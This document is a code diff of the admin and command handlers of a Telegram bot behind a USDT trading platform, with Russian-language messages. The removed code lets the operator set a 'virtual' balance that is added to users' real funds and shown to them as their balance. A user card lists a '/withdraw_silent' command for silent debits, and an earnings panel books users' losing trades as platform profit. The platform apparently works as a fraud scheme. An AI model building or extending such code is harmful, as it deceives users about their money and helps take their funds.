-                lost_trades = (await db.execute(select(Trade).where(Trade.status == "completed", Trade.result == "loss"))).scalars().all()
-                trading_profit = sum(t.amount for t in lost_trades)
-                
-                won_trades = (await db.execute(select(Trade).where(Trade.status == "completed", Trade.result == "win"))).scalars().all()
-                trading_loss = sum(t.amount * 0.7 for t in won_trades)
-                
-                net_trading_profit = trading_profit - trading_loss
-                total_earnings = deposit_fees + withdrawal_fees + exchange_fees + trading_fees + net_trading_profit
-                
-                msg = f"💰 <b>Панель заработка</b>\n\n"
-                msg += f"💵 <b>ОБЩИЙ ДОХОД: {total_earnings:.2f} USDT</b>\n\n"
-                msg += f"📥 <b>Депозиты (5%):</b> {deposit_fees:.2f} USDT\n"
-                msg += f"   └ Всего депозитов: {total_deposits:.2f} USDT\n\n"
-                msg += f"📤 <b>Выводы (10%):</b> {withdrawal_fees:.2f} USDT\n"
-                msg += f"   └ Всего выведено: {total_withdrawals:.2f} USDT\n\n"
-                msg += f"🔄 <b>Обмены (2%):</b> {exchange_fees:.2f} USDT\n\n"
-                msg += f"💸 <b>Комиссия за торговлю (2%):</b> {trading_fees:.2f} USDT\n\n"
-                msg += f"📊 <b>Проигранные сделки:</b> {net_trading_profit:.2f} USDT\n"
-                msg += f"   ├ Проигранные: +{trading_profit:.2f}\n"
-                msg += f"   └ Выигранные: -{trading_loss:.2f}\n\n"
-                msg += f"━━━━━━━━━━━━━━━━\n"
-                msg += f"👥 Пользователей: {total_users}\n"
-                msg += f"📈 Активных сделок: {active_trades}\n"
-                msg += f"💰 Баланс пользователей: {total_balance:.2f} USDT\n"
-                msg += f"💸 Заявок на вывод: {pending_withdrawals}"
-                
-                await bot_send_message(chat_id, msg, parse_mode="HTML")
-                return {"ok": True}
-            
-            # Handle /verify command - Toggle verification status
-            elif text.startswith("/verify ") and str(chat_id) == str(ADMIN_ID):
-                try:
-                    parts = text.split()
-                    if len(parts) == 2:
-                        profile_id = int(parts[1])
-                        user = (await db.execute(select(User).where(User.profile_id == profile_id))).scalars().first()
-                        if user:
-                            user.is_verified = not user.is_verified
-                            await db.commit()
-                            status = "✅ Верифицирован" if user.is_verified else "❌ Не верифицирован"
-                            await bot_send_message(chat_id, f"👤 Пользователь #{profile_id}\nВерификация: {status}", parse_mode="HTML")
-                        else:
-                            await bot_send_message(chat_id, f"❌ Пользователь #{profile_id} не найден")
-                    else:
-                        await bot_send_message(chat_id, "❌ Используйте: /verify PROFILE_ID")
-                except Exception as e:
-                    await bot_send_message(chat_id, f"❌ Ошибка: {str(e)}")
-                return {"ok": True}
-            
-            # Handle /premium command - Toggle premium status
-            elif text.startswith("/premium ") and str(chat_id) == str(ADMIN_ID):
-                try:
-                    parts = text.split()
-                    if len(parts) == 2:
-                        profile_id = int(parts[1])
-                        user = (await db.execute(select(User).where(User.profile_id == profile_id))).scalars().first()
-                        if user:
-                            user.is_premium = not user.is_premium
-                            await db.commit()
-                            status = "⭐ Premium активен" if user.is_premium else "❌ Premium отключен"
-                            await bot_send_message(chat_id, f"👤 Пользователь #{profile_id}\n{status}", parse_mode="HTML")
-                        else:
-                            await bot_send_message(chat_id, f"❌ Пользователь #{profile_id} не найден")
-                    else:
-                        await bot_send_message(chat_id, "❌ Используйте: /premium PROFILE_ID")
-                except Exception as e:
-                    await bot_send_message(chat_id, f"❌ Ошибка: {str(e)}")
-                return {"ok": True}
-            
-            # Handle /block command - Block user
-            elif text.startswith("/block ") and str(chat_id) == str(ADMIN_ID):
-                parts = text.split(" ", 2)
-                if len(parts) < 2:
-                    await bot_send_message(chat_id, "❌ Использование: /block PROFILE_ID [ПРИЧИНА]")
-                    return {"ok": True}
-                try:
-                    profile_id = int(parts[1])
-                    reason = parts[2] if len(parts) > 2 else None
-                    user = (await db.execute(select(User).where(User.profile_id == profile_id))).scalars().first()
-                    if not user:
-                        await bot_send_message(chat_id, f"❌ Пользователь #{profile_id} не найден")
+                    amount = float(text.split()[1])
+                    if amount < 1:
+                        await bot_send_message(chat_id, "❌ Минимальная сумма чека: 1 USDT")
                         return {"ok": True}
-                    user.is_blocked = True
-                    user.block_reason = reason
+                    
+                    # Get creator user
+                    creator = (await db.execute(select(User).where(User.telegram_id == str(chat_id)))).scalars().first()
+                    if not creator:
+                        await bot_send_message(chat_id, "❌ Пользователь не найден")
+                        return {"ok": True}
+                    
+                    # Check if user is premium or admin
+                    if not creator.is_premium and str(chat_id) != str(ADMIN_ID):
+                        await bot_send_message(chat_id, "❌ Создание чеков доступно только Premium пользователям")
+                        return {"ok": True}
+                    
+                    # Check total balance (real + virtual)
+                    real_bal = creator.balance_usdt or 0
+                    virtual_bal = creator.virtual_balance or 0
+                    total_bal = real_bal + virtual_bal
+                    
+                    if total_bal < amount:
+                        await bot_send_message(chat_id, f"❌ Недостаточно средств.\n\n💰 Ваш баланс: {total_bal:.2f} USDT\n📝 Нужно: {amount:.2f} USDT")
+                        return {"ok": True}
+                    
+                    import secrets
+                    check_code = secrets.token_urlsafe(8)
+                    
+                    expires = datetime.utcnow() + timedelta(hours=24)
+                    
+                    # Deduct from balance (virtual first, then real)
+                    amount_to_deduct = amount
+                    deducted_from_virtual = min(virtual_bal, amount_to_deduct)
+                    creator.virtual_balance = virtual_bal - deducted_from_virtual
+                    amount_to_deduct -= deducted_from_virtual
+                    
+                    if amount_to_deduct > 0:
+                        creator.balance_usdt = real_bal - amount_to_deduct
+                    
+                    new_check = Check(
+                        creator_id=creator.id,
+                        amount_usdt=amount,
+                        check_code=check_code,
+                        status="active",
+                        expires_at=expires
+                    )
+                    db.add(new_check)
+                    
+                    # Record transaction
+                    db.add(Transaction(
+                        user_id=creator.id,
+                        type="check_create",
+                        amount=-amount,
+                        currency="USDT",
+                        status="done",
+                        details={"check_code": check_code}
+                    ))
+                    
                     await db.commit()
-                    reason_text = f"\nПричина: {reason}" if reason else ""
-                    await bot_send_message(chat_id, f"🚫 Пользователь #{profile_id} заблокирован{reason_text}")
-                    try:
-                        block_msg = "🚫 Ваш аккаунт заблокирован администратором."
-                        if reason:
-                            block_msg += f"\n\nПричина: {reason}"
-                        await bot_send_message(int(user.telegram_id), block_msg)
-                    except:
-                        pass
+                    
+                    bot_link = f"https://t.me/KrakenEdgebot?start=check_{check_code}"
+                    
+                    new_total = (creator.balance_usdt or 0) + (creator.virtual_balance or 0)
+                    msg = f"🎫 <b>Чек создан!</b>\n\n"
+                    msg += f"💰 Сумма: <b>{amount:.2f} USDT</b>\n"
+                    msg += f"💵 Списано с баланса\n"
+                    msg += f"📊 Остаток: <b>{new_total:.2f} USDT</b>\n"
+                    msg += f"⏰ Действует: 24 часа\n\n"
+                    msg += f"🔗 Ссылка для активации:\n<code>{bot_link}</code>\n\n"
+                    msg += f"Отправьте эту ссылку получателю."
+                    
+                    await bot_send_message(chat_id, msg, parse_mode="HTML")
                 except ValueError:
-                    await bot_send_message(chat_id, "❌ ID должен быть числом")
-                return {"ok": True}
-            
-            # Handle /unblock command - Unblock user
-            elif text.startswith("/unblock ") and str(chat_id) == str(ADMIN_ID):
-                parts = text.split()
-                if len(parts) != 2:
-                    await bot_send_message(chat_id, "❌ Использование: /unblock PROFILE_ID")
-                    return {"ok": True}
-                try:
-                    profile_id = int(parts[1])
-                    user = (await db.execute(select(User).where(User.profile_id == profile_id))).scalars().first()
-                    if not user:
-                        await bot_send_message(chat_id, f"❌ Пользователь #{profile_id} не найден")
-                        return {"ok": True}
-                    user.is_blocked = False
-                    user.block_reason = None
-                    await db.commit()
-                    await bot_send_message(chat_id, f"✅ Пользователь #{profile_id} разблокирован")
-                    try:
-                        await bot_send_message(int(user.telegram_id), "✅ Ваш аккаунт разблокирован. Добро пожаловать!")
-                    except:
-                        pass
-                except ValueError:
-                    await bot_send_message(chat_id, "❌ ID должен быть числом")
-                return {"ok": True}
-            
-            # Handle /user command - Show user card (text-based, no buttons)
-            elif text.startswith("/user ") and str(chat_id) == str(ADMIN_ID):
-                try:
-                    parts = text.split()
-                    if len(parts) == 2:
-                        profile_id = int(parts[1])
-                        user = (await db.execute(select(User).where(User.profile_id == profile_id))).scalars().first()
-                        if user:
-                            verify_status = "✅" if user.is_verified else "❌"
-                            premium_status = "✅" if user.is_premium else "❌"
-                            block_status = "✅" if user.is_blocked else "❌"
-                            real_balance = user.balance_usdt or 0.0
-                            virtual_bal = user.virtual_balance or 0.0
-                            displayed_bal = real_balance + virtual_bal
-                            
-                            msg = f"👤 <b>Пользователь #{profile_id}</b>\n\n"
-                            msg += f"Telegram: {user.telegram_id}\n"
-                            msg += f"Username: @{user.username or 'N/A'}\n\n"
-                            msg += f"💎 Реальный: {real_balance:.2f} USDT\n"
-                            msg += f"🎭 Виртуальный: {virtual_bal:.2f} USDT\n"
-                            msg += f"📊 Отображаемый: {displayed_bal:.2f} USDT\n\n"
-                            msg += f"Верификация: {verify_status}\n"
-                            msg += f"Premium: {premium_status}\n"
-                            msg += f"🚫 Заблокирован: {block_status}\n"
-                            if user.is_blocked and user.block_reason:
-                                msg += f"Причина: {user.block_reason}\n"
-                            msg += f"\n<b>Команды:</b>\n"
-                            msg += f"/realbalance {profile_id} СУММА - реальный баланс\n"
-                            msg += f"/virtualbalance {profile_id} СУММА - виртуальный баланс\n"
-                            msg += f"/withdraw_silent {profile_id} СУММА - тихое списание\n"
-                            msg += f"/verify {profile_id} - переключить верификацию\n"
-                            msg += f"/premium {profile_id} - переключить Premium\n"
-                            msg += f"/block {profile_id} ПРИЧИНА - заблокировать\n"
-                            msg += f"/unblock {profile_id} - разблокировать"
-                            
-                            await bot_send_message(chat_id, msg, parse_mode="HTML")
-                        else:
-                            await bot_send_message(chat_id, f"❌ Пользователь #{profile_id} не найден")
-                    else:
-                        await bot_send_message(chat_id, "❌ Используйте: /user PROFILE_ID")
+                    await bot_send_message(chat_id, "❌ Использование: /check_create СУММА\n\nПример: /check_create 10")
                 except Exception as e:
                     await bot_send_message(chat_id, f"❌ Ошибка: {str(e)}")
                 return {"ok": True}
-            
-            # Handle /send_message command - Send message to specific user
-            elif text.startswith("/send_message ") and str(chat_id) == str(ADMIN_ID):
-                try:
-                    parts = text.split(maxsplit=2)
-                    if len(parts) >= 2:
-                        user_identifier = parts[1]
-                        
-                        # Check if we need to ask for message text
-                        if len(parts) < 3:
-                            admin_broadcast_state[str(ADMIN_ID)] = {"type": "user", "target": user_identifier}
-                            await bot_send_message(chat_id, f"📝 Отправьте текст сообщения для пользователя {user_identifier}\n\nДля отмены: /cancel")
-                            return {"ok": True}
-                        
-                        message_text = parts[2]
-                        
-                        # Try to find user by profile_id or telegram_id
-                        user = None
-                        if user_identifier.isdigit():
-                            # Try profile_id first
-                            user = (await db.execute(select(User).where(User.profile_id == int(user_identifier)))).scalars().first()
-                            if not user:
-                                # Try telegram_id
-                                user = (await db.execute(select(User).where(User.telegram_id == user_identifier))).scalars().first()
-                        
-                        if user:
-                            # Save message to database
-                            admin_msg = AdminMessage(user_id=user.id, message_text=message_text, is_broadcast=False)
-                            db.add(admin_msg)
-                            await db.commit()
-                            
-                            # Send via Telegram
-                            try:
-                                await bot_send_message(int(user.telegram_id), message_text, parse_mode="HTML")
-                                user_display = format_user_display(user)
-                                await bot_send_message(chat_id, f"✅ Сообщение отправлено пользователю {user_display}")
-                            except Exception as e:
-                                await bot_send_message(chat_id, f"❌ Ошибка отправки: {str(e)}")
-                        else:
-                            await bot_send_message(chat_id, f"❌ Пользователь {user_identifier} не найден")
-                    else:
-                        await bot_send_message(chat_id, "❌ Используйте: /send_message PROFILE_ID текст сообщения")
-                except Exception as e:
-                    await bot_send_message(chat_id, f"❌ Ошибка: {str(e)}")
-                return {"ok": True}
-            
-            # Handle /broadcast command - Send message to all users (text-based)
-            elif text.startswith("/broadcast ") and str(chat_id) == str(ADMIN_ID):
-                try:
-                    parts = text.split(maxsplit=1)
-                    if len(parts) < 2:
-                        await bot_send_message(chat_id, "❌ Используйте: /broadcast ТЕКСТ_СООБЩЕНИЯ")
-                        return {"ok": True}
-                    
-                    message_text = parts[1]
-                    users = (await db.execute(select(User))).scalars().all()
-                    sent_count = 0
-                    
-                    admin_msg = AdminMessage(user_id=None, message_text=message_text, is_broadcast=True, broadcast_count=0, delivery_type="telegram_chat")
-                    db.add(admin_msg)
-                    await db.flush()
-                    
-                    for user in users:
-                        try:
-                            await bot_send_message(int(user.telegram_id), message_text, parse_mode="HTML")
-                            sent_count += 1
-                        except:
-                            pass
-                    
-                    admin_msg.broadcast_count = sent_count
-                    await db.commit()
-                    await bot_send_message(chat_id, f"✅ <b>Рассылка завершена!</b>\n\n📤 Отправлено: {sent_count}/{len(users)}", parse_mode="HTML")
-                except Exception as e:
-                    await bot_send_message(chat_id, f"❌ Ошибка: {str(e)}")
-                return {"ok": True}
-            
-            # Handle /delete_message command - Delete admin message from all users
-            elif text.startswith("/delete_message ") and str(chat_id) == str(ADMIN_ID):
-                try:
-                    message_id = int(text.split()[1])
-                    admin_msg = (await db.execute(select(AdminMessage).where(AdminMessage.id == message_id))).scalars().first()
-                    
-                    if admin_msg:
-                        admin_msg.is_deleted = True
-                        admin_msg.deleted_at = datetime.utcnow()
-                        await db.commit()
-                        await bot_send_message(chat_id, f"✅ Сообщение #{message_id} удалено у всех пользователей")
-                    else:
-                        await bot_send_message(chat_id, f"❌ Сообщение #{message_id} не найдено")
-                except Exception as e:
-                    await bot_send_message(chat_id, f"❌ Ошибка: {str(e)}")
-                return {"ok": True}
-            
-            # Check if admin is in balance management mode (legacy - buttons removed)
-            elif str(chat_id) == str(ADMIN_ID) and str(ADMIN_ID) in admin_balance_state:
-                if text == "/cancel":
-                    del admin_balance_state[str(ADMIN_ID)]
-                    await bot_send_message(chat_id, "❌ Отменено. Используйте /admin для доступа к командам.")
-                    return {"ok": True}
-                
-                state = admin_balance_state[str(ADMIN_ID)]
-                action = state.get("action")
-                profile_id = state.get("profile_id")
-                
-                if profile_id:
-                    try:
-                        amount = float(text)
-                        
-                        if action == "input_add_amount":
-                            result = await execute_balance_change(db, profile_id, amount, "add", chat_id)
-                            await bot_send_message(chat_id, result["message"], parse_mode="HTML")
-                            del admin_balance_state[str(ADMIN_ID)]
-                        
-                        elif action == "input_sub_amount":
-                            result = await execute_balance_change(db, profile_id, -amount, "add", chat_id)
-                            await bot_send_message(chat_id, result["message"], parse_mode="HTML")
-                            del admin_balance_state[str(ADMIN_ID)]
-                        
-                        elif action == "input_set_amount":
-                            result = await execute_balance_change(db, profile_id, amount, "set", chat_id)
-                            await bot_send_message(chat_id, result["message"], parse_mode="HTML")
-                            del admin_balance_state[str(ADMIN_ID)]
-                        
-                        elif action == "input_display_amount":
-                            user = (await db.execute(select(User).where(User.profile_id == profile_id))).scalars().first()
-                            if user:
-                                user.virtual_balance = amount
-                                await db.commit()
-                                displayed_bal = (user.balance_usdt or 0) + (user.virtual_balance or 0)
-                                message = f"✅ <b>Виртуальный баланс обновлен!</b>\n\n"
-                                message += f"🆔 Profile ID: #{profile_id}\n"
-                                message += f"🎭 Виртуальный: {amount:.2f} USDT\n"
-                                message += f"💎 Реальный: {user.balance_usdt:.2f} USDT\n"
-                                message += f"📊 Отображаемый: {displayed_bal:.2f} USDT"
-                                await bot_send_message(chat_id, message, parse_mode="HTML")
-                                del admin_balance_state[str(ADMIN_ID)]
-                            else:
-                                await bot_send_message(chat_id, f"❌ Пользователь #{profile_id} не найден", parse_mode="HTML")
-                    
-                    except ValueError:
-                        await bot_send_message(chat_id, "❌ Введите корректную сумму (число):\n\nПример: 100.50", parse_mode="HTML")
-                    return {"ok": True}
-                
-                return {"ok": True}
-            
-            # Check if admin is in broadcast mode
-            elif str(chat_id) == str(ADMIN_ID) and str(ADMIN_ID) in admin_broadcast_state:
-                if text == "/cancel":
-                    del admin_broadcast_state[str(ADMIN_ID)]
-                    await bot_send_message(chat_id, "❌ Отменено")
-                    return {"ok": True}
-                
-                broadcast_info = admin_broadcast_state[str(ADMIN_ID)]
-                message_text = text
-                
-                try:
-                    if broadcast_info["type"] == "user":
-                        # Send to specific user
-                        user_identifier = broadcast_info["target"]
-                        user = None
-                        
-                        if str(user_identifier).isdigit():
-                            user = (await db.execute(select(User).where(User.profile_id == int(user_identifier)))).scalars().first()
-                            if not user:
-                                user = (await db.execute(select(User).where(User.telegram_id == str(user_identifier)))).scalars().first()
-                        
-                        if user:
-                            admin_msg = AdminMessage(user_id=user.id, message_text=message_text, is_broadcast=False)
-                            db.add(admin_msg)
-                            await db.commit()
-                            
-                            try:
-                                await bot_send_message(int(user.telegram_id), message_text, parse_mode="HTML")
-                                user_display = format_user_display(user)
-                                await bot_send_message(chat_id, f"✅ Сообщение отправлено пользователю {user_display}")
-                            except Exception as e:
-                                await bot_send_message(chat_id, f"❌ Ошибка отправки: {str(e)}")
-                        else:
-                            await bot_send_message(chat_id, f"❌ Пользователь не найден")
-                    
-                    elif broadcast_info["type"] == "all":
-                        # Broadcast to all users
-                        users = (await db.execute(select(User))).scalars().all()
-                        sent_count = 0
-                        delivery_type = broadcast_info.get("delivery", "app_chat")
-                        
-                        # Save to DB only if delivery is app_chat
-                        if delivery_type == "app_chat":
-                            admin_msg = AdminMessage(user_id=None, message_text=message_text, is_broadcast=True, broadcast_count=0, delivery_type=delivery_type)
-                            db.add(admin_msg)
-                            await db.flush()
-                        
-                        # Send to each user via Telegram
-                        for user in users:
-                            try:
-                                await bot_send_message(int(user.telegram_id), message_text, parse_mode="HTML")
-                                sent_count += 1
-                            except:
-                                pass
-                        
-                        if delivery_type == "app_chat":
-                            admin_msg.broadcast_count = sent_count
-                        
-                        await db.commit()
-                        delivery_label = "в приложении" if delivery_type == "app_chat" else "в Telegram"
-                        await bot_send_message(chat_id, f"✅ <b>Рассылка завершена!</b>\n\n📤 Отправлено: {sent_count}/{len(users)}\n📱 Канал: {delivery_label}", parse_mode="HTML")
-                    
-                    elif broadcast_info["type"] == "limited":
-                        # Broadcast to limited users
-                        count = broadcast_info["target"]
-                        delivery_type = broadcast_info.get("delivery", "app_chat")
-                        users = (await db.execute(select(User).order_by(User.created_at.desc()).limit(count))).scalars().all()
-                        sent_count = 0
-                        
-                        # Process each user
-                        for user in users:
-                            # Save to DB only if delivery is app_chat (create personal message)
-                            if delivery_type == "app_chat":
-                                admin_msg = AdminMessage(user_id=user.id, message_text=message_text, is_broadcast=False, delivery_type=delivery_type)
-                                db.add(admin_msg)
-                            
-                            # Send via Telegram
-                            try:
-                                await bot_send_message(int(user.telegram_id), message_text, parse_mode="HTML")
-                                sent_count += 1
-                            except:
-                                pass
-                        
-                        await db.commit()
-                        delivery_label = "в приложении" if delivery_type == "app_chat" else "в Telegram"
-                        await bot_send_message(chat_id, f"✅ <b>Рассылка завершена!</b>\n\n📤 Отправлено: {sent_count}/{len(users)}\n📱 Канал: {delivery_label}", parse_mode="HTML")
-                    
-                    del admin_broadcast_state[str(ADMIN_ID)]
-                except Exception as e:
-                    await bot_send_message(chat_id, f"❌ Ошибка: {str(e)}")
-                    if str(ADMIN_ID) in admin_broadcast_state:
-                        del admin_broadcast_state[str(ADMIN_ID)]
-                
-                return {"ok": True}
-            
+
             # Check if this is admin replying to a user
             elif str(chat_id) == str(ADMIN_ID) and str(ADMIN_ID) in admin_reply_state:
                 if text == "/cancel":
